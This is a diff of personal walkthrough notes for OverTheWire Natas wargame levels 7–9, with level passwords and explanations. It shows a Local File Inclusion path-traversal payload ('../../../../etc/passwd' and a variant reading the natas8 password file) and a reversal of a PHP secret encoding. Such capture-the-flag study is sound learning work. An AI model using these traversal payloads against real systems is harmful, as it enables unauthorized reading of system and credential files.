@@ -66,7 +66,7 @@ $secret = "FOEIUWGHFEEUHOFUOIU";
 
 lvl 7 --> lvl 8
 http://natas7.natas.labs.overthewire.org/
-natas6
+natas7
 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 // The point of this level is to test for Local File Inclusion
 // Cf. owasp.org : this vulnerability occurs due to thte use of user-supplied input without proper validation. 
@@ -74,6 +74,26 @@ natas6
 // Typically : http://vulnerable_host/preview.php?file=example.html
 // We would then go for : http://vulnerable_host/preview.php?file=../../../../etc/passwd
 // Here, we have a hint : password for webuser natas8 is in /etc/natas_webpass/natas8
-
-
+http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
 DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+lvl 8 --> lvl 9
+http://natas8.natas.labs.overthewire.org/
+natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+// The point of this level is to reverse ingineer a password encryption
+// Here is the logic :
+<?
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+} 
+?>
+// PHP logic :
+<?php
+echo(base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362'))));
+?>
+// Result: oubWYf2kBq
+// Adding it in the input we obtain : 
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
